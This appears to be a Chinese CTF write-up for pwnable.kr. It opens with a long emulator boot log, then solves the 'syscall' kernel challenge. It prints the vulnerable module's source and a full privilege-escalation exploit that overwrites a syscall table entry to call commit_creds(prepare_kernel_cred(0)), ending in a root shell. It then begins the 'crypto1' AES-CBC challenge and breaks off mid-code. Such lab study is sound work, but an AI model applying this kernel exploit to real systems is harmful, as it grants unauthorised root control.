|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have new mail.
Last login: Mon Jun 26 10:09:42 2023 from 121.18.90.141
pulseaudio: pa_context_connect() failed
pulseaudio: Reason: Connection refused
pulseaudio: Failed to initialize PA contextaudio: Could not init `pa' audio driver
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
Booting Linux on physical CPU 0x0
Initializing cgroup subsys cpuset
Linux version 3.11.4 (root@ubuntu) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #13 SMP Fri Jul 11 00:48:31 PDT 2014
CPU: ARMv7 Processor [410fc090] revision 0 (ARMv7), cr=10c53c7d
CPU: PIPT / VIPT nonaliasing data cache, VIPT nonaliasing instruction cache
Machine: ARM-Versatile Express
Memory policy: ECC disabled, Data cache writealloc
sched_clock: 32 bits at 24MHz, resolution 41ns, wraps every 178956ms
PERCPU: Embedded 7 pages/cpu @805ea000 s7296 r8192 d13184 u32768
Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 27940
Kernel command line: 'root=/dev/ram rw console=ttyAMA0 rdinit=/sbin/init'
PID hash table entries: 512 (order: -1, 2048 bytes)
Dentry cache hash table entries: 16384 (order: 4, 65536 bytes)
Inode-cache hash table entries: 8192 (order: 3, 32768 bytes)
Memory: 57292K/112640K available (3579K kernel code, 166K rwdata, 1020K rodata, 203K init, 138K bss, 55348K reserved)
Virtual kernel memory layout:
    vector  : 0xffff0000 - 0xffff1000   (   4 kB)
    fixmap  : 0xfff00000 - 0xfffe0000   ( 896 kB)
    vmalloc : 0x87000000 - 0xff000000   (1920 MB)
    lowmem  : 0x80000000 - 0x86e00000   ( 110 MB)
    modules : 0x7f000000 - 0x80000000   (  16 MB)
      .text : 0x80008000 - 0x80485f40   (4600 kB)
      .init : 0x80486000 - 0x804b8c80   ( 204 kB)
      .data : 0x804ba000 - 0x804e3b20   ( 167 kB)
       .bss : 0x804e3b20 - 0x805065d0   ( 139 kB)
SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=1, Nodes=1
Hierarchical RCU implementation.
        RCU restricting CPUs from NR_CPUS=4 to nr_cpu_ids=1.
NR_IRQS:16 nr_irqs:16 16
GIC CPU mask not found - kernel will fail to boot.
GIC CPU mask not found - kernel will fail to boot.
smp_twd: clock not found -2
Console: colour dummy device 80x30
Calibrating delay loop... 443.59 BogoMIPS (lpj=2217984)
pid_max: default: 32768 minimum: 301
Mount-cache hash table entries: 512
CPU: Testing write buffer coherency: ok
CPU0: thread -1, cpu 0, socket 0, mpidr 80000000
Setting up static identity map for 0x80366218 - 0x80366270
Brought up 1 CPUs
SMP: Total of 1 processors activated (443.59 BogoMIPS).
CPU: All CPU(s) started in SVC mode.
NET: Registered protocol family 16
DMA: preallocated 256 KiB pool for atomic coherent allocations
L310 cache controller enabled
l2x0: 8 ways, CACHE_ID 0x410000c8, AUX_CTRL 0x02420000, Cache size: 131072 B
hw-breakpoint: debug architecture 0x4 unsupported.
Serial: AMBA PL011 UART driver
mb:uart0: ttyAMA0 at MMIO 0x10009000 (irq = 37) is a PL011 rev1
console [ttyAMA0] enabled
mb:uart1: ttyAMA1 at MMIO 0x1000a000 (irq = 38) is a PL011 rev1
mb:uart2: ttyAMA2 at MMIO 0x1000b000 (irq = 39) is a PL011 rev1
mb:uart3: ttyAMA3 at MMIO 0x1000c000 (irq = 40) is a PL011 rev1
bio: create slab <bio-0> at 0
SCSI subsystem initialized
usbcore: registered new interface driver usbfs
usbcore: registered new interface driver hub
usbcore: registered new device driver usb
Advanced Linux Sound Architecture Driver Initialized.
Switched to clocksource v2m-timer1
NET: Registered protocol family 2
TCP established hash table entries: 1024 (order: 1, 8192 bytes)
TCP bind hash table entries: 1024 (order: 1, 8192 bytes)
TCP: Hash tables configured (established 1024 bind 1024)
TCP: reno registered
UDP hash table entries: 256 (order: 1, 8192 bytes)
UDP-Lite hash table entries: 256 (order: 1, 8192 bytes)
NET: Registered protocol family 1
RPC: Registered named UNIX socket transport module.
RPC: Registered udp transport module.
RPC: Registered tcp transport module.
RPC: Registered tcp NFSv4.1 backchannel transport module.
Trying to unpack rootfs image as initramfs...
rootfs image is not initramfs (junk in compressed archive); looks like an initrd
Freeing initrd memory: 49152K (83700000 - 86700000)
CPU PMU: probing PMU on CPU 0
hw perfevents: enabled with ARMv7 Cortex-A9 PMU driver, 1 counters available
jffs2: version 2.2. (NAND) © 2001-2006 Red Hat, Inc.
msgmni has been set to 207
io scheduler noop registered (default)
clcd-pl11x ct:clcd: PL111 rev2 at 0x10020000
clcd-pl11x ct:clcd: CT-CA9X4 hardware, XVGA display
Console: switching to colour frame buffer device 128x48
brd: module loaded
smsc911x: Driver version 2008-10-21
smsc911x smsc911x (unregistered net_device): couldn't get clock -2
libphy: smsc911x-mdio: probed
smsc911x smsc911x eth0: attached PHY driver [Generic PHY] (mii_bus:phy_addr=smsc911x-fffffff:01, irq=-1)
smsc911x smsc911x eth0: MAC Address: 52:54:00:12:34:56
isp1760 isp1760: NXP ISP1760 USB Host Controller
isp1760 isp1760: new USB bus registered, assigned bus number 1
isp1760 isp1760: Scratch test failed.
isp1760 isp1760: can't setup
isp1760 isp1760: USB bus 1 deregistered
isp1760: Failed to register the HCD device
usbcore: registered new interface driver usb-storage
mousedev: PS/2 mouse device common for all mice
rtc-pl031 mb:rtc: rtc core: registered pl031 as rtc0
mmci-pl18x mb:mmci: mmc0: PL181 manf 41 rev0 at 0x10005000 irq 41,42 (pio)
usbcore: registered new interface driver usbhid
usbhid: USB HID core driver
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
ALSA lib confmisc.c:768:(parse_card) cannot find card '0'
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1251:(snd_func_refer) error evaluating name
ALSA lib conf.c:4292:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:4771:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2266:(snd_pcm_open_noupdate) Unknown PCM default
alsa: Could not initialize DAC
alsa: Failed to open `default':
alsa: Reason: No such file or directory
audio: Failed to create voice `lm4549.out'
input: AT Raw Set 2 keyboard as /devices/mb:kmi0/serio0/input/input0
aaci-pl041 mb:aaci: ARM AC'97 Interface PL041 rev0 at 0x10004000, irq 43
aaci-pl041 mb:aaci: FIFO 512 entries
oprofile: using arm/armv7-ca9
TCP: cubic registered
NET: Registered protocol family 17
VFP support v0.3: implementor 41 architecture 3 part 30 variant 9 rev 0
rtc-pl031 mb:rtc: setting system clock to 2023-06-26 14:13:45 UTC (1687788825)
ALSA device list:
  #0: ARM AC'97 Interface PL041 rev0 at 0x10004000, irq 43
input: ImExPS/2 Generic Explorer Mouse as /devices/mb:kmi1/serio1/input/input1
RAMDISK: ext2 filesystem found at block 0
RAMDISK: Loading 49152KiB [1 disk] into ram disk... done.
VFS: Mounted root (ext2 filesystem) on device 1:0.
m: module license 'unspecified' taints kernel.
Disabling lock debugging due to kernel taint
sys_upper(number : 223) is added
cttyhack: can't open '/dev/ttyS0': No such file or directory
sh: can't access tty; job control turned off
/ $
```

下载并查看`syscall.c`的源代码。这段代码是一个`Linux`内核模块，用来添加一个名为`sys_upper`的新系统调用功能：将输入字符串中的小写字母转换为大写字母。

```c
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ wget http://pwnable.kr/bin/syscall.c

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ cat ./syscall.c         
// adding a new system call : sys_upper
// 所需的Linux内核头文件, 用于定义模块和系统调用所需的函数和类型
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <linux/syscalls.h>
// 宏定义SYS_CALL_TABLE以指定系统调用表的地址, 还宏定义了一个未使用的系统调用编号NR_SYS_UNUSED
#define SYS_CALL_TABLE          0x8000e348              // manually configure this address!!
#define NR_SYS_UNUSED           223
// 定义一个指向系统调用表的指针sct, 将被用于重新映射可写页
//Pointers to re-mapped writable pages
unsigned int** sct;
// 新添加系统调用函数sys_upper() 
// 它接受俩个指向字符数组的指针作为参数, 将输入字符串的小写字母转换为大写字母并将结果存储在输出数组中
asmlinkage long sys_upper(char *in, char* out){
    int len = strlen(in);
    int i;
    for(i=0; i<len; i++){
        if(in[i]>=0x61 && in[i]<=0x7a){
            out[i] = in[i] - 0x20;
        }
        else{
            out[i] = in[i];
        }
    }
    return 0;
}
// 模块的初始化函数initmodule, 将系统调用表的地址赋值给sct变量, 并将系统调用编号为NR_SYS_UNUSED的位置指向新添加的系统调用函数sys_upper。然后打印一条消息表示sys_upper已被添加。
static int __init initmodule(void ){
    sct = (unsigned int**)SYS_CALL_TABLE;
    sct[NR_SYS_UNUSED] = sys_upper;
    printk("sys_upper(number : 223) is added\n");
    return 0;
}
// 模块的退出函数exitmodule, 它不执行任何操作
static void __exit exitmodule(void ){
    return;
}

module_init( initmodule );
module_exit( exitmodule );
```

我们可以发现通过`sys_upper()`函数，未经授权的用户几乎能在任意地址写入任何字节的内容，具体的利用思路如下：

1.准备系统调用例程`sys_getroot()`。该函数接受两个函数指针作为参数，这两个函数指针分别指向内核函数 `prepare_kernel_cred` 和 `commit_creds`。函数 `sys_getroot` 在调用 `lpfn_prepare_kernel_cred` 函数并将其返回值作为参数传递给 `lpfn_commit_creds` 函数，以获取 root 权限。

```c
long sys_getroot(void* (*lpfn_prepare_kernel_cred)(void*), int (*lpfn_commit_creds)(void*)) {
    return lpfn_commit_creds(lpfn_prepare_kernel_cred(NULL));
}
```

2.使用`syscall sys_upper`将`&sys_CALL_TABLE[sys_upper]`处的`sys_upper`覆盖为`sys_getroot`。

```c
uint8_t buf[sizeof(void*) + 1] = {0};
*(void**)buf = (void*)sys_getroot;
syscall(SYS_upper, buf, SYS_CALL_TABLE + SYS_upper);
```

3.再次调用`SYS_upper`，地址为`prepare_kernel_cred`和`commit_creds`。

```c
syscall(SYS_upper, lpfn_prepare_kernel_cred, lpfn_commit_creds);
```

启动一个`shell`来查看存储在`/root/flag`中的内容：`Congratz!! addr_limit looks quite IMPORTANT now... huh?`。

Linux系统中每个进程拥有其对应的`struct cred`，用于记录该进程的`uid`。内核`exploit`的目的，便是修改当前进程的`cred`，从而提升权限以获取对系统的完全控制。当然，进程本身是无法篡改自己的`cred`，我们需要在内核空间中，通过以下方式来达到这一目的：

```
commit_creds(prepare_kernel_cred(0));
```

其中，`prepare_kernel_cred()`创建一个新的`cred`，如果参数为`0`则将`cred`中的`uid`, `gid`设置为`0`，即对应于root用户。随后，`commit_creds()`将这个`cred`应用于当前进程。此时，进程便提升到了`root`权限。这些方法的地址，可以通过`/proc/kallsyms`获取。总而言之，我们使用 `cat /proc/kallsyms | grep prepare_kernel_cred` 命令查找到 `prepare_kernel_cred` 函数的地址，并使用 `cat /proc/kallsyms | grep commit_creds` 命令查找到 `commit_creds` 函数的地址，然后将这两个地址作为参数传递给 `t0ur1st` 程序。

```bash
/ $ cd tmp
/tmp # cat >t0ur1st.c
#include <stddef.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdlib.h>
#include <stdio.h>

#define SYS_CALL_TABLE ((void**)0x8000e348)
#define SYS_upper 223

long sys_getroot(void* (*lpfn_prepare_kernel_cred)(void*), int (*lpfn_commit_creds)(void*)) {
    return lpfn_commit_creds(lpfn_prepare_kernel_cred(NULL));
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        puts("Usage:");
        puts("    ./solve <prepare_kernel_cred_addr> <commit_creds_addr>");
        return -1;
    } else {
        size_t i;
        void* lpfn_prepare_kernel_cred = (void*)strtoul(argv[1], NULL, 16);
        void* lpfn_commit_creds = (void*)strtoul(argv[2], NULL, 16);
        uint8_t buf[sizeof(void*) + 1] = {0};

        printf("[*] sys_getroot = %p\n", sys_getroot);

        *(void**)buf = (void*)sys_getroot;
        for (i = 0; i < sizeof(void*); ++i) {
            if (buf[i] == 0 || 'a' <= buf[i] && buf[i] <= 'z') {
                puts("Cannot get root for now.");
                return -1;
            }
        }

        printf("[*] lpfn_prepare_kernel_cred = %p\n", lpfn_prepare_kernel_cred);
        printf("[*] lpfn_commit_creds = %p\n", lpfn_commit_creds);

        syscall(SYS_upper, buf, SYS_CALL_TABLE + SYS_upper);
        syscall(SYS_upper, lpfn_prepare_kernel_cred, lpfn_commit_creds);

        puts("Launching shell...");
        system("/bin/sh");
        return 0;
    }
}/tmp # gcc -Ttext=0x03bbc010 t0ur1st.c -o t0ur1st
/tmp # cat /proc/kallsyms | grep prepare_kernel_cred
8003f924 T prepare_kernel_cred
80447f34 r __ksymtab_prepare_kernel_cred
8044ff8c r __kstrtab_prepare_kernel_cred
/tmp # cat /proc/kallsyms | grep commit_creds
8003f56c T commit_creds
8044548c r __ksymtab_commit_creds
8044ffc8 r __kstrtab_commit_creds
/tmp # ./t0ur1st 8003f924 8003f56c
[*] sys_getroot = 0x3bbc089
[*] lpfn_prepare_kernel_cred = 0x8003f924
[*] lpfn_commit_creds = 0x8003f56c
Launching shell...
/bin/sh: can't access tty; job control turned off
/tmp # id
uid=0 gid=0
/tmp # cat /root/flag
Congratz!! addr_limit looks quite IMPORTANT now... huh?
```

------

### crypto1

这是**Pwnable.kr**的第三十二个挑战`crypto1`，来自**[Rookiss]**部分。

```bash
We have isolated the authentication procedure to another box using RPC. 
The credential information between RPC is encrypted with AES-CBC, so it will be secure enough from sniffing.
I believe no one can login as admin but me :p

Download : http://pwnable.kr/bin/client.py
Download : http://pwnable.kr/bin/server.py


Running at : nc pwnable.kr 9006
```

将`client.py`和`server.py`下载，并审计代码，我直接在代码旁边写注释来解释程序啦。简而言之，该程序建立了一个基本的 XML-RPC 服务器，使用 AES-128 加密（CBC 模式）提供了身份验证机制。客户端可以通过 XML-RPC 远程调用 "authenticate" 方法，传递一个包含 ID、密码和 cookie 的加密数据包。服务器解密数据包，执行身份验证检查，并返回身份验证结果。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ wget http://pwnable.kr/bin/client.py

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ wget http://pwnable.kr/bin/server.py

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ cat ./server.py
#!/usr/bin/python
import xmlrpclib, hashlib
from SimpleXMLRPCServer import SimpleXMLRPCServer
from Crypto.Cipher import AES
import os, sys

BLOCK_SIZE = 16   # AES加密的块大小
PADDING = '\x00'  # AES加密的填充字符
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING  # 使用PADDING填充字符串s, 以确保其长度是BLOCK_SIZE的倍数
EncodeAES = lambda c, s: c.encrypt(pad(s)).encode('hex')  # 接受AES密码c, 对消息s进行填充加密并返回16进制加密数据
DecodeAES = lambda c, e: c.decrypt(e.decode('hex'))  # 接受AES密码c, 对消息e进行解密并返回解密数据

# server's secrets
key = 'erased. but there is something on the real source code'
iv = 'erased. but there is something on the real source code'
cookie = 'erased. but there is something on the real source code'
# 使用密码块链接（CBC）模式执行AES-128解密, 接受消息msg,使用提供的key和初始化向量iv创建AES密码对象，解密消息并在返回解密数据之前删除填充字符
def AES128_CBC(msg):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return DecodeAES(cipher, msg).rstrip(PADDING)
# 用于对服务器接收到的数据包进行身份验证,
def authenticate(e_packet):
    packet = AES128_CBC(e_packet)  # 使用AES128_CBC函数对数据包进行解密并将其分割为三个部分: id, pw, cookie

    id = packet.split('-')[0]
    pw = packet.split('-')[1]
    # 检查数据包的cookie是否与服务器的cookie匹配
    if packet.split('-')[2] != cookie:
        return 0        # request is not originated from expected server
    # 计算id和cookie的组合的哈希, 并将其与提供的密码pw进行比较
